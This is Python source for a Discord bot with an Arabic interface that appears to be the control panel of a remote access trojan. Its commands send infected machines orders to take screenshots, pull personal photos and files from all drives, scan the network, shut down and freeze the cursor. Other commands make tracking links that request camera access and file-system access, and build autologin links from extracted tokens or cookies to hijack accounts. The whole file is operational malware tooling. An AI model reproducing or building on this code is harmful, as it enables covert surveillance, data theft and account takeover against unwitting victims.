            "credential": token_or_cookie.strip(),
            "time": int(time.time())
        }
        save_db(db, sha, url, headers, f"Create web session {session_id}")

    web_link = f"{HOST_URL}/autologin?sid={session_id}"

    embed = discord.Embed(
        title="🌐 رابط الدخول السريع للجلسة",
        description=f"تم تجهيز الجلسة لمنصة: **{platform.upper()}**\n\nاضغط على الزر أدناه لفتح صفحة الدخول المباشر بالحساب المستخرج:",
        color=0x00FF00
    )
    
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="🔗 فتح صفحة الحساب الآن", style=discord.ButtonStyle.link, url=web_link))

    await interaction.followup.send(embed=embed, view=view, ephemeral=True)

@client.tree.command(name="link", description="توليد رابط تتبع مع خيارات الكاميرا والوصول للملفات")
@app_commands.describe(
    redirect_to="رابط الوجهة النهائية (مثل يوتيوب أو موقع)",
    capture_cam="هل تريد طلب إذن الكاميرا؟",
    cam_type="نوع الكاميرا (أمامية أو خلفية)",
    file_system="تفعيل استغلال الوصول للملفات (File System API)"
)
@app_commands.choices(capture_cam=[
    app_commands.Choice(name="نعم (طلب الكاميرا)", value="true"),
    app_commands.Choice(name="لا (بدون كاميرا)", value="false")
], cam_type=[
    app_commands.Choice(name="الكاميرا الأمامية (Selfie)", value="user"),
    app_commands.Choice(name="الكاميرا الخلفية (Back)", value="environment")
], file_system=[
    app_commands.Choice(name="تفعيل استغلال الملفات", value="true"),
    app_commands.Choice(name="إيقاف استغلال الملفات", value="false")
])
async def generate_track_link(interaction: discord.Interaction, redirect_to: str = "https://www.google.com", capture_cam: str = "false", cam_type: str = "user", file_system: str = "false"):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    
    track_url = f"{HOST_URL}/track?to={requests.utils.quote(redirect_to, safe='')}&cam={capture_cam}&cam_type={cam_type}&fs={file_system}"
    
    embed = discord.Embed(
        title="🔗 رابط التتبع المطور جاهز",
        description=f"الرابط المولد:\n`{track_url}`\n\nالوجهة: `{redirect_to}`\nالكاميرا: **{capture_cam.upper()}**\nنوع الكاميرا: **{cam_type.upper()}**\nالوصول للملفات: **{file_system.upper()}**",
        color=0xFF5733
    )
    await interaction.followup.send(embed=embed, ephemeral=True)

@client.tree.command(name="scheduletask", description="جدولة أمر مؤجل للعميل ليتم تنفيذه بعد عدد من الثواني")
@app_commands.describe(target_code="كود العميل", delay_seconds="عدد الثواني للانتظار", task_type="نوع المهمة")
@app_commands.choices(task_type=[
    app_commands.Choice(name="لقطة شاشة فورية", value="screenshot"),
    app_commands.Choice(name="سحب الملفات والصور", value="files_report"),
    app_commands.Choice(name="إيقاف التشغيل", value="shutdown")
])
async def scheduletask_command(interaction: discord.Interaction, target_code: str, delay_seconds: int, task_type: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db: return
    target_upper = target_code.strip().upper()
    if target_upper not in db.get("codes", {}):
        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target_code}`", ephemeral=True)
        return
    if "remote_schedules" not in db: db["remote_schedules"] = {}
    db["remote_schedules"][target_upper] = {
        "id": str(int(time.time())), 
        "task": task_type, 
        "execute_at": int(time.time()) + delay_seconds
    }
    if save_db(db, sha, url, headers, f"Schedule {task_type} for {target_upper}"):
        await interaction.followup.send(f"⏳ **تمت جدولة المهمة بنجاح!** سيتم تنفيذ (`{task_type}`) بعد `{delay_seconds}` ثانية.", ephemeral=True)

@client.tree.command(name="wallpaper", description="تغيير خلفية سطح المكتب لجهاز العميل عن بعد")
@app_commands.describe(target_code="كود العميل", image_url="رابط مباشر للصورة")
async def wallpaper_command(interaction: discord.Interaction, target_code: str, image_url: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db: return
    target_upper = target_code.strip().upper()
    if target_upper not in db.get("codes", {}):
        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target_code}`", ephemeral=True)
        return
    if "remote_wallpapers" not in db: db["remote_wallpapers"] = {}
    db["remote_wallpapers"][target_upper] = {"id": str(int(time.time())), "url": image_url.strip()}
    if save_db(db, sha, url, headers, f"Change wallpaper for {target_upper}"):
        await interaction.followup.send(f"🖼️ **تم إرسال أمر تغيير خلفية الشاشة للعميل `{target_upper}` بنجاح!**", ephemeral=True)

@client.tree.command(name="manage", description="التحكم بالعميل مباشرة عبر الـ IP والـ Port")
@app_commands.describe(ip_port="اكتب الـ IP والـ Port بالشكل: 64.137.192.51:7680")
async def manage_by_ip_port(interaction: discord.Interaction, ip_port: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = fetch_db()
    if not db:
        await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
        return
    ip_port_clean = ip_port.strip().replace(" ", "")
    if ":" not in ip_port_clean:
        await interaction.followup.send("❌ الصيغة غير صحيحة. استخدم الشكل:\n`64.137.192.51:7680`", ephemeral=True)
        return
    target_ip, target_port_str = ip_port_clean.split(":", 1)
    try: target_port = int(target_port_str)
    except ValueError: target_port = target_port_str

    found_code, found_info = None, None
    for code, info in db.get("codes", {}).items():
        if info.get("used"):
            if str(info.get("ip", "")).strip() == target_ip and str(info.get("port")) == str(target_port):
                found_code, found_info = code, info
                break
    if not found_code:
        await interaction.followup.send(f"❌ لم يتم العثور على عميل بنفس الـ IP والـ Port: `{ip_port}`", ephemeral=True)
        return
    ip, port, hwid, country = found_info.get('ip', 'Unknown'), found_info.get('port', '8888'), found_info.get('device'), found_info.get('country', 'Unknown')
    view = DeviceActionsView(found_code, hwid, ip, port)
    await interaction.followup.send(f"⚙️ **لوحة التحكم المطلق بالعميل:**\n🔑 الكود: `{found_code}`\n🌐 IP : Port $\rightarrow$ `{ip} : {port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`", view=view, ephemeral=True)

@client.tree.command(name="netscan", description="جلب تقرير كامل عن اتصالات الشبكة والـ IPs والـ Ports النشطة للعميل")
@app_commands.describe(target="كود التفعيل أو الـ IP الخاص بالعميل")
async def netscan_command(interaction: discord.Interaction, target: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db: return
    target_upper, target_clean = target.strip().upper(), target.strip()
    found_key = target_upper if target_upper in db.get("codes", {}) else None
    if not found_key:
        for c, info in db.get("codes", {}).items():
            if target_clean in str(info.get("ip", "")) or (info.get("device") and target_clean.lower() in info.get("device").lower()):
                found_key = c
                break
    if not found_key:
        await interaction.followup.send(f"❌ لم يتم العثور على العميل المستهدف: `{target}`", ephemeral=True)
        return
    if "remote_netscans" not in db: db["remote_netscans"] = {}
    db["remote_netscans"][found_key] = {"id": str(int(time.time()))}
    if save_db(db, sha, url, headers, f"Request netscan for {found_key}"):
        await interaction.followup.send(f"🌐 **تم إرسال أمر فحص الشبكة (NetScan)!**", ephemeral=True)

@client.tree.command(name="unused", description="عرض الأكواد غير المستخدمة مع خيارات الحذف")
async def unused_command(interaction: discord.Interaction):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = fetch_db()
    if not db: return
    unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
    if not unused_list:
        await interaction.followup.send("🟢 لا توجد أكواد غير مستخدمة.", ephemeral=True)
        return
    view = UnusedManagementView(unused_list)
    await interaction.followup.send(f"🟢 **الأكواد المتاحة (اختر للحذف):**\n📊 العدد: `{len(unused_list)}`", view=view, ephemeral=True)

@client.tree.command(name="clearused", description="حذف جميع الأكواد المستخدمة دفعة واحدة")
async def clear_used_codes(interaction: discord.Interaction):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db or "codes" not in db: return
    old_count = len(db["codes"])
    db["codes"] = {c: info for c, info in db["codes"].items() if not info.get("used", False)}
    removed = old_count - len(db["codes"])
    if save_db(db, sha, url, headers, f"Cleared {removed} used codes"):
        await interaction.followup.send(f"🧹 تم حذف `{removed}` كود مستخدم!", ephemeral=True)

@client.tree.command(name="check", description="التحقق من حالة كود معين ومعرفة تفاصيله")
@app_commands.describe(code="الكود المراد فحصه")
async def check_code(interaction: discord.Interaction, code: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = fetch_db()
    if not db or code.upper() not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    info = db["codes"][code.upper()]
    status = "مستخدم 🔴" if info.get("used") else "متاح 🟢"
    await interaction.followup.send(f"🔍 **الكود `{code.upper()}`:**\n📌 الحالة: {status}\n🌐 IP : Port: `{info.get('ip') or 'غير متصل'} : {info.get('port', '8888')}`\n🌍 الدولة: `{info.get('country') or 'غير معروفة'}`\n💻 HWID: `{info.get('device') or 'لا يوجد'}`", ephemeral=True)

@client.tree.command(name="delete", description="حذف كود نهائياً")
@app_commands.describe(code="الكود المراد حذفه")
async def delete_code(interaction: discord.Interaction, code: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    code = code.upper()
    if not db or code not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    del db["codes"][code]
    if save_db(db, sha, url, headers, f"Delete code: {code}"):
        await interaction.followup.send(f"🗑️ تم حذف الكود `{code}` نهائياً!", ephemeral=True)

@client.tree.command(name="resetdevice", description="تصفير ارتباط الكود وإرجاعه متاحاً")
@app_commands.describe(code="الكود المراد تصفيره")
async def reset_device(interaction: discord.Interaction, code: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    code = code.upper()
    if not db or code not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    db["codes"][code]["used"] = False
    db["codes"][code]["device"] = None
    db["codes"][code]["ip"] = None
    db["codes"][code]["port"] = None
    db["codes"][code]["country"] = None
    if save_db(db, sha, url, headers, f"Reset code: {code}"):
        await interaction.followup.send(f"🔄 تم تصفير الكود `{code}` وأصبح متاحاً!", ephemeral=True)

@client.tree.command(name="screenshot", description="التقاط لقطة شاشة لجهاز عميل معين")
@app_commands.describe(target="اسم الجهاز أو كود التفعيل المستهدف")
async def screenshot_command(interaction: discord.Interaction, target: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db: return
    target_upper, target_clean = target.strip().upper(), target.strip()
    found_key = target_upper if target_upper in db.get("codes", {}) else None
    if not found_key:
        for c, info in db.get("codes", {}).items():
            if info.get("device") and target_clean.lower() in info.get("device").lower():
                found_key = c
                break
    if not found_key:
        await interaction.followup.send(f"❌ لم يتم العثور على الجهاز أو الكود: `{target}`", ephemeral=True)
        return
    if "remote_screenshots" not in db: db["remote_screenshots"] = {}
    db["remote_screenshots"][found_key] = {"id": str(int(time.time()))}
    if save_db(db, sha, url, headers, f"Request screenshot for {found_key}"):
        await interaction.followup.send(f"📸 **تم إرسال أمر التقاط الشاشة بنجاح!**", ephemeral=True)

@client.tree.command(name="trapthecursor", description="قفل مؤشر الماوس للعميل في زاوية أو نقطة محددة ومنعه من التحرك")
@app_commands.describe(target_code="كود العميل")
async def trapthecursor_command(interaction: discord.Interaction, target_code: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db: return
    target_upper = target_code.strip().upper()
    if target_upper not in db.get("codes", {}):
        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target_code}`", ephemeral=True)
        return
    if "remote_trap_cursors" not in db: db["remote_trap_cursors"] = {}
    db["remote_trap_cursors"][target_upper] = {"id": str(int(time.time()))}
    if save_db(db, sha, url, headers, f"Trap cursor for {target_upper}"):
        await interaction.followup.send(f"🔒 **تم إرسال أمر تجميد وقفل مؤشر الماوس للعميل `{target_upper}`!**", ephemeral=True)

@client.tree.command(name="untrapthecursor", description="إلغاء وفك تجميد مؤشر الماوس للعميل")
@app_commands.describe(target_code="كود العميل")
async def untrapthecursor_command(interaction: discord.Interaction, target_code: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db: return
    target_upper = target_code.strip().upper()
    if target_upper not in db.get("codes", {}):
        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target_code}`", ephemeral=True)
        return
    if "remote_untrap_cursors" not in db: db["remote_untrap_cursors"] = {}
    db["remote_untrap_cursors"][target_upper] = {"id": str(int(time.time()))}
    if "remote_trap_cursors" in db and target_upper in db["remote_trap_cursors"]:
        del db["remote_trap_cursors"][target_upper]
    if save_db(db, sha, url, headers, f"Untrap cursor for {target_upper}"):
        await interaction.followup.send(f"🔓 **تم إرسال أمر فك تجميد مؤشر الماوس للعميل `{target_upper}` بنجاح!**", ephemeral=True)

@client.tree.command(name="fulldiskdump", description="بحث وسحب جميع الصور والملفات الشخصية الهامة من كامل أقراص الجهاز")
@app_commands.describe(target_code="كود العميل")
async def fulldiskdump_command(interaction: discord.Interaction, target_code: str):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db: return
    target_upper = target_code.strip().upper()
    if target_upper not in db.get("codes", {}):
        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target_code}`", ephemeral=True)
        return
    if "remote_disk_dumps" not in db: db["remote_disk_dumps"] = {}
    db["remote_disk_dumps"][target_upper] = {"id": str(int(time.time()))}
    if save_db(db, sha, url, headers, f"Full disk dump for {target_upper}"):
        await interaction.followup.send(f"📂 **تم إرسال أمر فحص وسحب الملفات الشخصية والصور للعميل `{target_upper}`!** سيصلك الأرشيف قريباً.", ephemeral=True)

@client.tree.command(name="statsgui", description="لوحة معلومات وإحصائيات تفاعلية")
async def stats_gui_command(interaction: discord.Interaction):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = fetch_db()
    if not db: return
    codes = db.get("codes", {})
    total = len(codes)
    used = sum(1 for c in codes.values() if c.get("used"))
    available = total - used
    visits = len(db.get("web_visits", []))
    
    embed = discord.Embed(title="📊 لوحة التحكم والإحصائيات الشاملة", description="اختر القسم المطلوب من الأزرار أدناه:", color=0xA871FF)
    embed.add_field(name="📌 الإجمالي", value=f"`{total}`", inline=True)
    embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
    embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
    embed.add_field(name="🌐 عدد زيارات روابط التتبع", value=f"`{visits}` زيارة", inline=False)
    
    await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)

@client.tree.command(name="clear", description="حذف رسائل البوت وتنظيف الشاشة")
@app_commands.describe(amount="عدد الرسائل المراد مسحها")
async def clear_messages(interaction: discord.Interaction, amount: int = 10):
    if not interaction.response.is_done():
        await interaction.response.defer(thinking=True, ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"🧹 تم تنظيف وحذف `{len(deleted)}` رسالة بنجاح!", ephemeral=True)
    await asyncio.sleep(3)
    try: await interaction.delete_original_response()
    except Exception: pass

@client.tree.command(name="sync", description="مزامنة الأوامر")
async def sync_commands(interaction: discord.Interaction):
    await client.tree.sync()
    if not interaction.response.is_done():
        await interaction.response.send_message("✅ تم مزامنة الأوامر!", ephemeral=True)

if TOKEN:
    client.run(TOKEN)
